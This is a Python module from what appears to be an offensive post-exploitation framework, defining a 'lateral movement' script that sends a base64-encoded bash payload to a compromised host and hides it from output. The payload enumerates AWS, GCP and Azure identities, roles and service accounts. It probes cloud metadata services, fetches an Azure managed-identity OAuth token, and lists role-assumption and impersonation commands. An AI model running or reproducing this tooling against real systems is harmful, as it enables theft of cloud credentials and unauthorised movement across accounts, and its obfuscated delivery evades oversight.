"""Cloud IAM role assumption script."""

from ..base import OperatorScript, ScriptResult


class CloudIAMAssumption(OperatorScript):
    """Assume cloud IAM roles for lateral movement across accounts."""
    
    name = "Cloud IAM Assumption"
    description = "Assume cloud IAM roles for lateral movement"
    category = "lateral"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] CLOUD IAM ROLE ASSUMPTION"
echo "============================="
echo ""

echo "[+] Checking for AWS CLI:"
if command -v aws &>/dev/null; then
    echo "[+] AWS CLI available"
    aws --version
    
    echo ""
    echo "[*] Current AWS identity:"
    aws sts get-caller-identity 2>/dev/null || echo "[-] No AWS credentials or access denied"
    
    echo ""
    echo "[*] Available AWS profiles:"
    aws configure list-profiles 2>/dev/null || echo "[-] No profiles configured"
    
    echo ""
    echo "[*] Checking for assumable roles:"
    aws iam list-roles 2>/dev/null | grep -i "Arn\|RoleName" | head -20 || echo "[-] Cannot list roles"
else
    echo "[-] AWS CLI not found"
fi
echo ""

echo "[+] Checking for GCP CLI:"
if command -v gcloud &>/dev/null; then
    echo "[+] gcloud available"
    gcloud --version
    
    echo ""
    echo "[*] Current GCP identity:"
    gcloud auth list 2>/dev/null || echo "[-] Not authenticated"
    
    echo ""
    echo "[*] GCP service accounts:"
    gcloud iam service-accounts list 2>/dev/null || echo "[-] Cannot list service accounts"
else
    echo "[-] gcloud not found"
fi
echo ""

echo "[+] Checking for Azure CLI:"
if command -v az &>/dev/null; then
    echo "[+] Azure CLI available"
    az --version
    
    echo ""
    echo "[*] Current Azure identity:"
    az account show 2>/dev/null || echo "[-] Not authenticated"
    
    echo ""
    echo "[*] Azure managed identity:"
    curl -s -H "Metadata:true" \
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
        2>/dev/null | head -5 || echo "[-] No managed identity"
else
    echo "[-] Azure CLI not found"
fi
echo ""

echo "[+] Checking for metadata service (all clouds):"
echo "[*] AWS:"
timeout 2 curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null && \
    echo "[+] AWS metadata accessible"
echo ""
echo "[*] GCP:"
timeout 2 curl -s -H "Metadata-Flavor: Google" \
    http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null && \
    echo "[+] GCP metadata accessible"
echo ""
echo "[*] Azure:"
timeout 2 curl -s -H "Metadata:true" \
    http://169.254.169.254/metadata/instance?api-version=2021-02-01 2>/dev/null && \
    echo "[+] Azure metadata accessible"
echo ""

echo "[+] IAM role assumption commands:"
echo ""
echo "  AWS AssumeRole:"
echo "    aws sts assume-role --role-arn ROLE_ARN --role-session-name SESSION"
echo ""
echo "  GCP impersonation:"
echo "    gcloud auth application-default login --impersonate-service-account=SA_EMAIL"
echo ""
echo "  Azure managed identity:"
echo "    az login --identity"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Checking cloud IAM assumption...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="Cloud IAM assumption checks executed",
                metadata={"script": "cloud_iam_assumption"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
